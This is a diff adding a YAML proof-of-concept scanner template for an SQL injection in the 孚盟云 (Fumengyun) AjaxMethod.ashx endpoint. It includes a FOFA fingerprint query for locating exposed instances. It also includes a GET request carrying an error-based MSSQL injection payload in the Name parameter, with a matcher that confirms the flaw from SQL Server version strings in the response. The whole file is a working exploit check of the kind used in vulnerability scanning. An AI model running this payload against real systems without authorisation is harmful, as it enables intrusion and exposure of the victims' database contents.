@@ -1,0 +1,22 @@
+id: poc-yaml-fumengyun-ajaxmethodashx-sqli
+info:
+  name: 孚盟云 AjaxMethod.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: title="孚盟云 "
+requests:
+- method: GET
+  path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1'+and+1=@@version--+
+  expression: 'status_code == 500 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,"Copyright (c) Microsoft Corporation")
+
+    '
+variables: {}
+transport: http
